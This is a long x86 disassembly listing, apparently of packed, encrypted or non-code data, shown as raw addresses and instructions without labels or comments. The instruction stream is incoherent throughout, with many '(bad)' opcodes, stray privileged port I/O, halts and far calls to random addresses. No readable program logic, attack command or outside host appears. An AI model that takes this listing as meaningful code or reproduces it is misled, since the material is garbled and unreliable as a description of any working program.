  408a7d:	mov    ch,0x41
  408a7f:	call   0x9d5a:0xaaead781
  408a86:	mov    edx,DWORD PTR [edi-0x2da0012d]
  408a8c:	sar    dl,cl
  408a8e:	mov    ch,ch
  408a90:	jnp    0x408a7a
  408a92:	pop    edx
  408a93:	sub    BYTE PTR [edi-0x7c],bh
  408a96:	rol    DWORD PTR ds:0x33afa578,cl
  408a9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a9d:	push   ss
  408a9e:	mov    ds:0x39e5db3d,eax
  408aa3:	out    0x66,eax
  408aa5:	push   ecx
  408aa6:	pop    ss
  408aa7:	mov    dh,0x46
  408aa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408aaa:	cs inc edi
  408aac:	mov    ah,0xd
  408aae:	sub    eax,0x35d13971
  408ab3:	pop    edx
  408ab4:	ficom  WORD PTR [esi+0x7329d8e]
  408aba:	aam    0x1f
  408abc:	xchg   ebx,eax
  408abd:	into   
  408abe:	mov    ch,0x71
  408ac0:	test   al,0xe6
  408ac2:	scas   eax,DWORD PTR es:[edi]
  408ac3:	jno    0x408ac9
  408ac5:	mov    ds:0x3ef0b,al
  408aca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408acb:	mov    ds:0xdc04a2dc,al
  408ad0:	xchg   ebx,eax
  408ad1:	mov    ebp,0x904f5193
  408ad6:	je     0x408b0d
  408ad8:	shl    BYTE PTR [ecx],1
  408ada:	mov    cl,0xa1
  408adc:	in     eax,0x31
  408ade:	fmul   QWORD PTR [edx+0x7480b49d]
  408ae4:	pop    esi
  408ae5:	stos   BYTE PTR es:[edi],al
  408ae6:	stos   DWORD PTR es:[edi],eax
  408ae7:	push   ds
  408ae8:	mov    al,BYTE PTR [ebp-0x1]
  408aeb:	sub    DWORD PTR [edx+0x3518f802],esi
  408af1:	fnstenv ds:0x2be740c5
  408af7:	adc    eax,0x8f385648
  408afc:	pop    eax
  408afd:	lahf   
  408afe:	shl    BYTE PTR [ebx+ecx*1],1
  408b01:	add    BYTE PTR [edx+0x15],dl
  408b04:	test   BYTE PTR [edx-0x303e8948],0x41
  408b0b:	adc    ecx,DWORD PTR [ecx-0x33]
  408b0e:	mov    ebp,0x468516c6
  408b13:	mov    edx,0x8d6c7c4
  408b18:	arpl   di,sp
  408b1a:	pop    ebx
  408b1b:	scas   eax,DWORD PTR es:[edi]
  408b1c:	jl     0x408b81
  408b1e:	mov    al,ds:0xe2f9b43
  408b23:	not    DWORD PTR [ebp+0x18]
  408b26:	inc    edx
  408b27:	push   eax
  408b28:	sbb    BYTE PTR [ebp-0x76ff9421],al
  408b2e:	add    BYTE PTR [eax],dh
  408b30:	and    dl,BYTE PTR [edx+0x4e]
  408b33:	jno    0x408ba8
  408b35:	push   ebp
  408b36:	mov    ds:0x50ae316e,eax
  408b3b:	cdq    
  408b3c:	jne    0x408b90
  408b3e:	outs   dx,DWORD PTR ds:[esi]
  408b3f:	pop    esp
  408b40:	add    BYTE PTR [esi],0xd8
  408b43:	dec    ebx
  408b44:	(bad)  
  408b45:	push   0xde65dc05
  408b4a:	in     eax,dx
  408b4b:	dec    ecx
  408b4c:	xchg   DWORD PTR ds:0x17164d53,esp
  408b52:	add    al,0xed
  408b54:	test   eax,0x614c5ce3
  408b59:	scas   eax,DWORD PTR es:[edi]
  408b5a:	dec    eax
  408b5b:	sahf   
  408b5c:	sbb    cl,BYTE PTR [ebx-0x5b]
  408b5f:	xor    esp,DWORD PTR [ebx]
  408b61:	xor    DWORD PTR ds:0x8b728b42,ebx
  408b67:	push   ds
  408b68:	push   ebx
  408b69:	sbb    BYTE PTR [edi-0x48],bh
  408b6c:	and    BYTE PTR [edi-0x57],bl
  408b6f:	inc    esi
  408b70:	inc    bx
  408b72:	inc    esi
  408b73:	xchg   BYTE PTR [ebx],ah
  408b75:	cmp    ecx,eax
  408b77:	mov    edx,0xe66c1cb3
  408b7c:	xor    DWORD PTR [eax+0x50b40154],ebx
  408b82:	jecxz  0x408b50
  408b84:	shl    BYTE PTR ds:[ecx+0x2bb7ab3f],cl
  408b8b:	sub    eax,0x2447158e
  408b90:	loopne 0x408b63
  408b92:	shr    DWORD PTR [esi],0xb5
  408b95:	xor    al,0x5e
  408b97:	aad    0xda
  408b99:	jle    0x408bad
  408b9b:	repnz lock imul ebp,DWORD PTR [ebx+0x2e],0x67
  408ba1:	fs dec ecx
  408ba3:	ret    0x7e6c
  408ba6:	aaa    
  408ba7:	in     eax,dx
  408ba8:	icebp  
  408ba9:	cmp    eax,0xf0a31418
  408bae:	dec    esp
  408baf:	and    bl,BYTE PTR [ecx-0x7b]
  408bb2:	adc    esp,ecx
  408bb4:	idiv   DWORD PTR [edi+0x35ada4f3]
  408bba:	repz push ebp
  408bbc:	outs   dx,DWORD PTR ds:[esi]
  408bbd:	ins    BYTE PTR es:[edi],dx
  408bbe:	sub    BYTE PTR [ebx],cl
  408bc0:	fmul   DWORD PTR [edi]
  408bc2:	mov    BYTE PTR [esi-0x1fb0cbe0],dh
  408bc8:	fisubr DWORD PTR cs:[edx-0x5042e385]
  408bcf:	pop    es
  408bd0:	jae    0x408c20
  408bd2:	fldcw  WORD PTR ss:[ecx-0x39]
  408bd6:	mov    ebx,0xd7a2104c
  408bdb:	clc    
  408bdc:	stos   BYTE PTR es:[edi],al
  408bdd:	iret   
  408bde:	inc    esi
  408bdf:	sub    DWORD PTR [ecx+ebp*1+0xb],ecx
  408be3:	pusha  
  408be4:	leave  
  408be5:	xchg   BYTE PTR [ecx],al
  408be7:	pop    ss
  408be8:	jb     0x408bb8
  408bea:	pop    ss
  408beb:	loopne 0x408c1f
  408bed:	mul    DWORD PTR [ecx+edi*2+0x5568add6]
  408bf4:	arpl   dx,bp
  408bf6:	and    DWORD PTR [eax+edi*2-0x7a49719b],ecx
  408bfd:	mov    esp,0x50c13188
  408c02:	push   ecx
  408c03:	jp     0x408c66
  408c05:	js     0x408bee
  408c07:	pop    ebx
  408c08:	add    eax,0xd5178728
  408c0d:	mov    ah,0x4f
  408c0f:	scas   eax,DWORD PTR es:[edi]
  408c10:	xchg   esi,eax
  408c11:	push   esi
  408c12:	mov    ds:0x83ed87fd,al
  408c17:	repnz loop 0x408c25
  408c1a:	xor    BYTE PTR [ecx+edi*8+0xe],ch
  408c1e:	dec    edx
  408c1f:	dec    eax
  408c20:	shl    cl,cl
  408c22:	push   cs
  408c23:	shl    DWORD PTR [ebx+ebp*1-0x6c3bc7a5],1
  408c2a:	pop    ss
  408c2b:	jo     0x408c3f
  408c2d:	call   FWORD PTR fs:[edx+0x69]
  408c31:	lahf   
  408c32:	xchg   ecx,eax
  408c33:	mov    ebx,0x5ed5666f
  408c38:	loopne 0x408c59
  408c3a:	sbb    DWORD PTR [eax],ebp
  408c3c:	std    
  408c3d:	shl    DWORD PTR [ecx-0xe],1
  408c40:	push   0xfffffffc
  408c42:	dec    ebx
  408c43:	je     0x408c55
  408c45:	xchg   ebx,eax
  408c46:	and    BYTE PTR [esi+0x76],ch
  408c49:	ja     0x408bfd
  408c4b:	cmp    edi,DWORD PTR [eax]
  408c4d:	sbb    BYTE PTR [ecx],al
  408c4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c50:	and    eax,0xf1d70ac7
  408c55:	ret    0x9b1b
  408c58:	out    0x9,eax
  408c5a:	(bad)  
  408c5b:	das    
  408c5c:	lea    ecx,ds:0xa946ea14
  408c62:	or     eax,0x1bf23893
  408c67:	idiv   ebx
  408c69:	shl    BYTE PTR [ecx+0x1a],cl
  408c6c:	fisub  DWORD PTR [ecx]
  408c6e:	add    eax,DWORD PTR [ebp-0x5a0140f0]
  408c74:	dec    eax
  408c75:	or     DWORD PTR [ecx+0x44c122b9],edi
  408c7b:	dec    ebx
  408c7c:	in     al,0x53
  408c7e:	and    DWORD PTR [ebx+ebp*2-0x53],0xfffffff2
  408c83:	and    eax,0xc680c8ed
  408c88:	outs   dx,DWORD PTR ds:[esi]
  408c89:	ss or  esp,esi
  408c8c:	sbb    eax,0x71484683
  408c91:	loop   0x408c5b
  408c93:	lahf   
  408c94:	std    
  408c95:	ret    0x1dc4
  408c98:	push   ebx
  408c99:	ja     0x408c58
  408c9b:	and    DWORD PTR [edi+0x6],esp
  408c9e:	or     eax,0x648a01b1
  408ca3:	daa    
  408ca4:	mov    esi,DWORD PTR ds:0x998c5732
  408caa:	and    al,BYTE PTR [eax+0x4d808d9f]
  408cb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cb1:	stos   DWORD PTR es:[edi],eax
  408cb2:	push   es
  408cb3:	loop   0x408d04
  408cb5:	jnp    0x408ca0
  408cb7:	mov    ds:0x20329a7e,eax
  408cbc:	cmp    BYTE PTR [eax-0x3e],dh
  408cbf:	js     0x408c7b
  408cc1:	push   ebx
  408cc2:	sub    al,0x44
  408cc4:	cmp    BYTE PTR [esi-0xa2d465d],al
  408cca:	inc    esp
  408ccb:	inc    esi
  408ccc:	push   ds
  408ccd:	jbe    0x408c83
  408ccf:	mov    al,ds:0x51119a7
  408cd4:	xchg   esi,eax
  408cd5:	jg     0x408c83
  408cd7:	cld    
  408cd8:	xchg   ecx,eax
  408cd9:	mov    WORD PTR [esi-0x30],ds
  408cdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cdd:	ins    DWORD PTR es:[edi],dx
  408cde:	xchg   edx,eax
  408cdf:	cmp    ah,BYTE PTR [edi]
  408ce1:	out    0xc8,al
  408ce3:	(bad)  
  408ce4:	mov    dl,0xd0
  408ce6:	rcl    DWORD PTR [eax-0x46],0xe5
  408cea:	jno    0x408d30
  408cec:	pop    edx
  408ced:	mov    al,ds:0x7e0c1ffe
  408cf2:	fstp   TBYTE PTR [edx+0x1ade86a5]
  408cf8:	cdq    
  408cf9:	mov    ah,0x41
  408cfb:	sbb    BYTE PTR [edi+0x3e],ch
  408cfe:	shl    BYTE PTR [ecx-0x6a],0xf6
  408d02:	sahf   
  408d03:	dec    ecx
  408d04:	(bad)  
  408d05:	int3   
  408d06:	je     0x408cd9
  408d08:	mov    dh,0x9d
  408d0a:	imul   eax,DWORD PTR ds:0xf2537734,0xb7c30081
  408d14:	fild   QWORD PTR [ebx-0x7459d657]
  408d1a:	das    
  408d1b:	add    eax,0x9d1a3856
  408d20:	mov    edi,0xd6663486
  408d25:	dec    edx
  408d26:	xchg   DWORD PTR [ebp-0x27ee88eb],ecx
  408d2c:	ret    
  408d2d:	retf   
  408d2e:	or     dl,BYTE PTR [ebx+0xb]
  408d31:	repnz mov al,0xbb
  408d34:	iret   
  408d35:	fild   QWORD PTR [edx+0x55d9c62c]
  408d3b:	mov    bh,BYTE PTR [ecx-0x532e507d]
  408d41:	les    edx,FWORD PTR [edx]
  408d43:	jb     0x408db3
  408d45:	jle    0x408d7c
  408d47:	push   esp
  408d48:	xchg   edi,eax
  408d49:	and    BYTE PTR [ebx-0x3dbd60c8],bl
  408d4f:	stc    
  408d50:	inc    ebp
  408d51:	imul   ecx,ecx,0xebc70ae3
  408d57:	shl    BYTE PTR [eax],1
  408d59:	pop    edi
  408d5a:	call   0x4dc79f58
  408d5f:	fnstcw WORD PTR [eax]
  408d61:	dec    ebp
  408d62:	jnp    0x408d68
  408d64:	out    0x2,eax
  408d66:	fs pop esi
  408d68:	cmp    al,0xa9
  408d6a:	sub    al,0xd1
  408d6c:	jl     0x408d96
  408d6e:	push   ds
  408d6f:	nop
  408d70:	push   esi
  408d71:	neg    DWORD PTR [edx+0x21]
  408d74:	sbb    al,0x1e
  408d76:	fdiv   st(0),st
  408d78:	dec    esp
  408d79:	mov    bh,BYTE PTR [edx+0x4627541]
  408d7f:	scas   al,BYTE PTR es:[edi]
  408d80:	sti    
  408d81:	cmc    
  408d82:	or     DWORD PTR cs:[edx-0x1a],ebp
  408d86:	retf   
  408d87:	shl    BYTE PTR [esp+esi*4-0x73],cl
  408d8b:	loopne 0x408d1e
  408d8d:	retf   0xf279
  408d90:	in     al,dx
  408d91:	push   ebp
  408d92:	inc    ecx
  408d93:	jo     0x408d1a
  408d95:	enter  0x5287,0xcf
  408d99:	sub    al,0x69
  408d9b:	call   0x6afa1d87
  408da0:	(bad)  
  408da1:	bound  esi,QWORD PTR [edi-0x9]
  408da4:	ret    0x5b0c
  408da7:	lods   eax,DWORD PTR ds:[esi]
  408da8:	adc    al,0x81
  408daa:	mov    ecx,0xe2f06d9c
  408daf:	out    dx,al
  408db0:	sub    DWORD PTR [edx+0x7700c06d],edi
  408db6:	cli    
  408db7:	shl    BYTE PTR [ebp+0x3003f6e4],1
  408dbd:	fcomp  DWORD PTR [ebp+0x5f]
  408dc0:	pushf  
  408dc1:	out    0x99,al
  408dc3:	sbb    ch,BYTE PTR [ebp+esi*1+0x36d0ab19]
  408dca:	ins    DWORD PTR es:[edi],dx
  408dcb:	cmp    DWORD PTR [eax-0x62456517],0x28
  408dd2:	sbb    DWORD PTR [ecx-0x2f],esp
  408dd5:	xor    ebp,edi
  408dd7:	shl    BYTE PTR [ebp-0x62],1
  408dda:	xchg   edx,eax
  408ddb:	out    0x6c,eax
  408ddd:	test   al,0x85
  408ddf:	xchg   BYTE PTR [edx+0x76],dl
  408de2:	in     al,0x55
  408de4:	test   eax,0x11e3f218
  408de9:	out    0xda,eax
  408deb:	or     bh,bh
  408ded:	inc    esp
  408dee:	push   ds
  408def:	mov    es,edi
  408df1:	hlt    
  408df2:	loope  0x408e19
  408df4:	xor    al,0x4c
  408df6:	jb     0x408d97
  408df8:	outs   dx,DWORD PTR ds:[esi]
  408df9:	(bad)  
  408dfb:	fimul  DWORD PTR [edx-0x64]
  408dfe:	add    BYTE PTR [eax+0x41],ch
  408e01:	jno    0x408e21
  408e03:	ins    BYTE PTR es:[edi],dx
  408e04:	dec    edx
  408e05:	ret    0x9f0b
  408e08:	mov    dl,0xe8
  408e0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e0b:	mov    ebx,0x484cb0f2
  408e10:	hlt    
  408e11:	push   ebp
  408e12:	nop
  408e13:	xchg   esi,eax
  408e14:	dec    ecx
  408e15:	or     eax,0xa8cdf16e
  408e1a:	test   BYTE PTR [ecx],cl
  408e1c:	rcl    al,0xfc
  408e1f:	outs   dx,DWORD PTR ds:[esi]
  408e20:	std    
  408e21:	jae    0x408e64
  408e23:	add    DWORD PTR [eax-0x8],ebp
  408e26:	or     eax,DWORD PTR [ebx+0x40]
  408e29:	mov    al,0xee
  408e2b:	cmp    DWORD PTR ds:0x3edc7469,ecx
  408e31:	xor    dh,dh
  408e33:	mul    DWORD PTR [ecx]
  408e35:	pop    ecx
  408e36:	aam    0xb8
  408e38:	mov    edi,0x5b8907d5
  408e3d:	xor    dl,ch
  408e3f:	jp     0x408e35
  408e41:	into   
  408e42:	lods   al,BYTE PTR ds:[esi]
  408e43:	sbb    al,0xad
  408e45:	scas   eax,DWORD PTR es:[edi]
  408e46:	scas   eax,DWORD PTR es:[edi]
  408e47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e48:	lock add al,0xda
  408e4b:	daa    
  408e4c:	mov    ecx,0x83e4b03d
  408e51:	rcr    cl,cl
  408e53:	(bad)  
  408e55:	fistp  QWORD PTR [edx+0x71]
  408e58:	ficomp WORD PTR [eax-0x1b2c9556]
  408e5e:	aam    0x2e
  408e60:	ds mov ah,0x3b
  408e63:	inc    eax
  408e64:	imul   edi,DWORD PTR [edi],0x624cd700
  408e6a:	or     BYTE PTR [edx+0x50],0xd3
  408e6e:	(bad)  
  408e6f:	mov    ebx,0x771739f4
  408e74:	mov    BYTE PTR [eax+0x1029303],ah
  408e7a:	jo     0x408ed6
  408e7c:	push   edi
  408e7d:	inc    esp
  408e7e:	jecxz  0x408e25
  408e80:	ins    DWORD PTR es:[edi],dx
  408e81:	test   BYTE PTR [ebp+0x2772cd18],bl
  408e87:	jb     0x408ec9
  408e89:	int    0xea
  408e8b:	lahf   
  408e8c:	xchg   edi,eax
  408e8d:	inc    edi
  408e8e:	call   0xf77e:0x5292a505
  408e95:	sub    DWORD PTR [esp+ecx*2-0x26],esi
  408e99:	dec    ecx
  408e9a:	mov    ebp,0x43d5039b
  408e9f:	and    bl,BYTE PTR [ebx+0x47]
  408ea2:	rcr    BYTE PTR [esi-0x2a0502fd],1
  408ea8:	out    0xcf,al
  408eaa:	mov    ah,0xa7
  408eac:	add    BYTE PTR [edx+0x7c],dl
  408eaf:	loop   0x408eed
  408eb1:	lods   al,BYTE PTR ds:[esi]
  408eb2:	fwait
  408eb3:	mov    esi,0xb13d8d73
  408eb8:	test   al,0x39
  408eba:	arpl   WORD PTR [edi+ebp*2-0x35],di
  408ebe:	cs pop esp
  408ec0:	mov    ebp,0x8a2c570
  408ec5:	push   0xffffff9b
  408ec7:	aaa    
  408ec8:	stc    
  408ec9:	dec    esp
  408eca:	xchg   esp,eax
  408ecb:	into   
  408ecc:	fidiv  WORD PTR [ebp+0x49]
  408ecf:	scas   eax,DWORD PTR es:[edi]
  408ed0:	test   esi,eax
  408ed2:	sbb    DWORD PTR [eax],ebp
  408ed4:	sahf   
  408ed5:	and    dh,BYTE PTR [ebx+eiz*1+0x62c9529c]
  408edc:	pop    ebx
  408edd:	aas    
  408ede:	pop    ebx
  408edf:	ja     0x408ec2
  408ee1:	dec    esp
  408ee2:	out    dx,al
  408ee3:	mov    bh,0x28
  408ee5:	and    DWORD PTR [eax],ecx
  408ee7:	mov    eax,0x3901334f
  408eec:	inc    ebx
  408eed:	(bad)  
  408eee:	out    0xe8,eax
  408ef0:	mov    dh,0x2a
  408ef2:	fwait
  408ef3:	sbb    edx,DWORD PTR [ebx]
  408ef5:	outs   dx,DWORD PTR ds:[esi]
  408ef6:	push   ds
  408ef7:	int3   
  408ef8:	lods   eax,DWORD PTR ds:[esi]
  408ef9:	fstp   TBYTE PTR [eax+0x38]
  408efc:	fwait
  408efd:	mov    WORD PTR [ecx],fs
  408eff:	xchg   ecx,eax
  408f00:	sub    DWORD PTR es:[ebx],esp
  408f03:	pop    esp
  408f04:	dec    esi
  408f05:	daa    
  408f06:	js     0x408f28
  408f08:	test   eax,0xd22d36cf
  408f0d:	ja     0x408f3c
  408f0f:	mov    edi,0xa2b1a8d6
  408f14:	mov    bl,0x26
  408f16:	push   ds
  408f17:	test   DWORD PTR [eax+0xbd64a87],esi
  408f1d:	sbb    ebx,DWORD PTR [ebp-0x45]
  408f20:	and    dh,BYTE PTR [ebx]
  408f22:	pop    ss
  408f23:	aaa    
  408f24:	fild   DWORD PTR [edi+0x5142b784]
  408f2a:	mov    bl,0xf
  408f2c:	mov    ecx,0x60f970e9
  408f31:	fcomp  DWORD PTR [esi+0x49]
  408f34:	or     DWORD PTR [ecx],edi
  408f36:	cli    
  408f37:	mov    dl,0x9d
  408f39:	push   esi
  408f3a:	clc    
  408f3b:	shl    BYTE PTR [edx],1
  408f3d:	push   esi
  408f3e:	ret    
  408f3f:	shl    BYTE PTR [eax],0xa9
  408f42:	cli    
  408f43:	dec    ebp
  408f44:	aaa    
  408f45:	jb     0x408eee
  408f47:	fcomp  st(6)
  408f49:	popf   
  408f4a:	jno    0x408f65
  408f4c:	pcmpeqd mm0,QWORD PTR [ebx-0x591bb74f]
  408f53:	fwait
  408f54:	and    eax,0x870735a1
  408f59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f5a:	push   esp
  408f5b:	fwait
  408f5c:	retf   
  408f5d:	push   edx
  408f5e:	pop    eax
  408f5f:	inc    ebx
  408f60:	call   0xc39ed6bb
  408f65:	or     BYTE PTR [ecx+0x7202bc21],cl
  408f6b:	sub    DWORD PTR ds:0x80c1bfb0,0x18
  408f72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f73:	sub    BYTE PTR [eax+0x4e8230fb],ch
  408f79:	or     esp,DWORD PTR [eax+eiz*1-0x53a5426]
  408f80:	outs   dx,BYTE PTR ds:[esi]
  408f81:	mov    bl,0x43
  408f83:	aaa    
  408f84:	out    0x4d,eax
  408f86:	cli    
  408f87:	xor    BYTE PTR [edi-0x5a1ab95b],0x41
  408f8e:	push   eax
  408f8f:	mov    eax,0x548ff965
  408f94:	shl    DWORD PTR [esi+eax*8+0x29],1
  408f98:	xchg   DWORD PTR [edx],esi
  408f9a:	daa    
  408f9b:	and    ebx,DWORD PTR [ebx]
  408f9d:	xor    BYTE PTR [ecx],bl
  408f9f:	scas   eax,DWORD PTR es:[edi]
  408fa0:	push   ss
  408fa1:	or     esi,edx
  408fa3:	ret    
  408fa4:	mov    WORD PTR [esp+edi*1],fs
  408fa7:	pop    ds
  408fa8:	dec    edi
  408fa9:	mov    ds:0xd196caec,eax
  408fae:	mov    ecx,0x2dd39159
  408fb3:	call   0xc0ed:0x2c7c7a66
  408fba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fbc:	pop    esi
  408fbd:	and    cl,BYTE PTR [eax+0x626521c]
  408fc3:	jmp    0x2223:0xf712117b
  408fca:	mov    ecx,0xc35ea29f
  408fcf:	popa   
  408fd0:	sbb    eax,0x9f7b091d
  408fd5:	add    al,0x66
  408fd7:	mov    ebp,DWORD PTR [esp+edi*2-0x3a33882e]
  408fde:	push   ss
  408fdf:	idiv   DWORD PTR ss:[ecx]
  408fe2:	nop
  408fe3:	mov    ch,al
  408fe5:	addr16 ror cl,cl
  408fe8:	gs int3 
  408fea:	add    ch,BYTE PTR [esi+0x39]
  408fed:	jmp    0x65f159bf
  408ff2:	adc    ebx,ecx
  408ff4:	jbe    0x409073
  408ff6:	inc    ecx
  408ff7:	fistp  QWORD PTR [edx]
  408ff9:	sub    BYTE PTR [esi+0x32],ch
  408ffc:	loop   0x409028
  408ffe:	mov    ebx,0x3b39959c
  409003:	or     al,0xb6
  409005:	(bad)  
  409006:	sbb    DWORD PTR [edi+0x48c647cf],esi
  40900c:	mov    dl,0xf6
  40900e:	xchg   DWORD PTR [edx+0x4a],ebp
  409011:	add    al,0x5d
  409013:	push   ebp
  409014:	mov    ecx,0x3d68c3b1
  409019:	adc    BYTE PTR [ecx+0x73],bl
  40901c:	mov    ds:0xe13977ea,eax
  409021:	mov    ecx,0xfb6fe9bd
  409026:	(bad)  
  409028:	mov    esi,0x1b674026
  40902d:	jg     0x408fb8
  40902f:	mov    ds:0x23eee179,eax
  409034:	mov    esp,0x10487cc2
  409039:	ror    BYTE PTR [ecx-0x6a98196b],0xfe
  409040:	sbb    al,0xf1
  409042:	outs   dx,DWORD PTR ds:[esi]
  409043:	cmp    ah,BYTE PTR [eax-0x67]
  409046:	mov    cl,0x4f
  409048:	or     DWORD PTR [ebp-0x1],ebp
  40904b:	inc    esi
  40904c:	ja     0x409071
  40904e:	pop    ss
  40904f:	xchg   ebp,eax
  409050:	arpl   WORD PTR [ecx],bx
  409052:	sti    
  409053:	arpl   WORD PTR [esi+0x7fda3180],dx
  409059:	push   ss
  40905a:	shl    DWORD PTR [edx],1
  40905c:	scas   eax,DWORD PTR es:[edi]
  40905d:	cmp    esp,DWORD PTR [esi+0x547055bb]
  409063:	sbb    al,0x29
  409065:	xor    BYTE PTR [edi],0x47
  409068:	mov    ds:0x4dedd218,eax
  40906d:	repnz adc edi,ecx
  409070:	sar    DWORD PTR [esi],1
  409072:	imul   edi,DWORD PTR [ebp-0x1c],0x90d7334a
  409079:	and    DWORD PTR [ebx],esi
  40907b:	xor    bh,al
  40907d:	or     al,0x77
  40907f:	(bad)  
  409080:	push   0x70
  409082:	pop    eax
  409083:	mov    al,0xca
  409085:	inc    eax
  409086:	jne    0x409036
  409088:	or     BYTE PTR [eax-0x7d],ch
  40908b:	mov    ds:0xdf8d6,eax
  409090:	push   esp
  409091:	sub    eax,0xbb9c50a5
  409096:	dec    ebx
  409097:	add    eax,0xd2ee2b0a
  40909c:	fisubr WORD PTR [esi+0x1e]
  40909f:	or     eax,0x728bad15
  4090a4:	pop    esp
  4090a5:	xlat   BYTE PTR ds:[ebx]
  4090a6:	xchg   ebx,eax
  4090a7:	fstp   DWORD PTR [ebx+0x6ade3fb]
  4090ad:	add    DWORD PTR [eax],edx
  4090af:	pop    edi
  4090b0:	push   ss
  4090b1:	add    eax,0xf7ebda4c
  4090b6:	shl    BYTE PTR [ebx+0x68],1
  4090b9:	jg     0x4090bc
  4090bb:	xor    eax,0x472cd523
  4090c0:	cmp    eax,0x551ee6db
  4090c5:	pusha  
  4090c6:	pop    ds
  4090c7:	push   edi
  4090c8:	push   0x2179d77a
  4090cd:	(bad)  
  4090ce:	jno    0x4090e2
  4090d0:	(bad)
  4090d4:	adc    cl,BYTE PTR [edx+0x24]
  4090d7:	xchg   ebp,eax
  4090d8:	mov    edi,0x5ee37ffa
  4090dd:	js     0x40912a
  4090df:	vpmovmskb edx,ymm4
  4090e3:	addr16 xor eax,0xfef56ec2
  4090e9:	ss jns 0x40909d
  4090ec:	sub    eax,0xa965561
  4090f1:	icebp  
  4090f2:	shr    BYTE PTR [ebp+0x34ac4674],cl
  4090f8:	ja     0x409175
  4090fa:	dec    ecx
  4090fb:	inc    ebp
  4090fc:	les    ecx,FWORD PTR [eax+0x2a]
  4090ff:	or     DWORD PTR [edi],esi
  409101:	in     al,0x7e
  409103:	mov    ds:0xd25c0a8e,eax
  409108:	shl    DWORD PTR [ecx],1
  40910a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40910b:	or     BYTE PTR [ebx+0x4a],dl
  40910e:	test   al,0x32
  409110:	mov    eax,ds:0xfb7d44b4
  409115:	pop    edi
  409116:	inc    edx
  409117:	fcom   QWORD PTR [edi-0x14]
  40911a:	nop
  40911b:	jmp    0x1389:0x3660def0
  409122:	lock and ch,BYTE PTR [edi]
  409125:	mov    DWORD PTR [esi+0x3c7d81f8],esp
  40912b:	dec    esp
  40912c:	jae    0x40912d
  40912e:	mov    ch,0x46
  409130:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409131:	xchg   esi,eax
  409132:	dec    eax
  409133:	mov    ah,0xc2
  409135:	pop    esp
  409136:	inc    esp
  409137:	test   WORD PTR [esi],sp
  40913a:	push   edi
  40913b:	(bad)  
  40913c:	xor    al,0x69
  40913e:	and    ecx,ebx
  409140:	adc    BYTE PTR [edx],ch
  409142:	test   DWORD PTR [ecx-0x2b],eax
  409145:	(bad)  
  409146:	sub    eax,0xc0de05ef
  40914b:	gs (bad) 
  40914d:	xchg   ebx,eax
  40914e:	sub    esp,DWORD PTR [esi+0x4a]
  409151:	mov    ds:0x532999e8,al
  409156:	sub    bl,BYTE PTR [edi]
  409158:	mov    eax,0x152b3bea
  40915d:	jnp    0x40916e
  40915f:	sub    eax,DWORD PTR [ebp+esi*4-0x263034eb]
  409166:	mov    ds:0xaf5fc5b1,eax
  40916b:	jge    0x4549750c
  409171:	ins    BYTE PTR es:[edi],dx
  409172:	xchg   ecx,eax
  409173:	xchg   esp,eax
  409174:	sbb    esi,esp
  409176:	int3   
  409177:	loopne 0x4090fb
  409179:	xor    DWORD PTR [ecx+0x38],ebx
  40917c:	sbb    al,0xee
  40917e:	shl    DWORD PTR [esi],1
  409180:	jp     0x4091b7
  409182:	inc    esi
  409183:	out    dx,al
  409184:	icebp  
  409185:	mov    cl,0xc6
  409187:	popf   
  409188:	(bad)  
  409189:	aad    0x99
  40918b:	sub    esp,DWORD PTR [ebx+0x21]
  40918e:	jecxz  0x409128
  409190:	inc    eax
  409191:	loopne 0x409183
  409193:	push   ds
  409194:	push   ebp
  409195:	add    ch,BYTE PTR [ebx-0x44]
  409198:	loope  0x4091d6
  40919a:	call   0x7906f498
  40919f:	int3   
  4091a0:	jae    0x40913f
  4091a2:	lods   eax,DWORD PTR ds:[esi]
  4091a3:	fist   DWORD PTR [ecx]
  4091a5:	ret    
  4091a6:	aad    0x9a
  4091a8:	mov    DWORD PTR [esp+eiz*8],edx
  4091ab:	mov    dl,0xa4
  4091ad:	xchg   ebp,eax
  4091ae:	js     0x40917d
  4091b0:	inc    edi
  4091b1:	jb     0x4091c3
  4091b3:	push   ebp
  4091b4:	pop    edx
  4091b5:	hlt    
  4091b6:	call   0x6b202fb5
  4091bb:	pop    ebp
  4091bc:	je     0x409155
  4091be:	dec    esp
  4091bf:	mov    al,0xd0
  4091c1:	pop    ebx
  4091c2:	or     al,0xd6
  4091c4:	pop    edi
  4091c5:	loop   0x409238
  4091c7:	sub    ch,BYTE PTR [ecx+0x22566f69]
  4091cd:	pop    ecx
  4091ce:	sbb    dh,al
  4091d0:	cmp    BYTE PTR [edx-0x7a],al
  4091d3:	mov    ds:0x5e11a3cf,eax
  4091d8:	jge    0x40915f
  4091da:	lods   al,BYTE PTR ds:[esi]
  4091db:	or     BYTE PTR [edi],dh
  4091dd:	ss aaa 
  4091df:	mov    ebx,0xf088e6b1
  4091e4:	ret    0x980b
  4091e7:	xor    ebx,DWORD PTR [ebp-0x161bc3c]
  4091ed:	and    al,0x1d
  4091ef:	rcl    BYTE PTR [ecx-0x3],cl
  4091f2:	int3   
  4091f3:	sahf   
  4091f4:	and    eax,DWORD PTR [edx+eiz*1+0x5c153798]
  4091fb:	into   
  4091fc:	arpl   WORD PTR [ebp+0x1efd5c15],sp
  409202:	aaa    
  409203:	jbe    0x40920a
  409205:	jno    0x409190
  409207:	lods   eax,DWORD PTR ds:[esi]
  409208:	push   ebp
  409209:	push   ebx
  40920a:	loop   0x409264
  40920c:	shr    WORD PTR [eax+ebp*8],0x36
  409211:	push   edx
  409212:	pop    esp
  409213:	stos   DWORD PTR es:[edi],eax
  409214:	or     dh,BYTE PTR [ebx-0x1a]
  409217:	push   eax
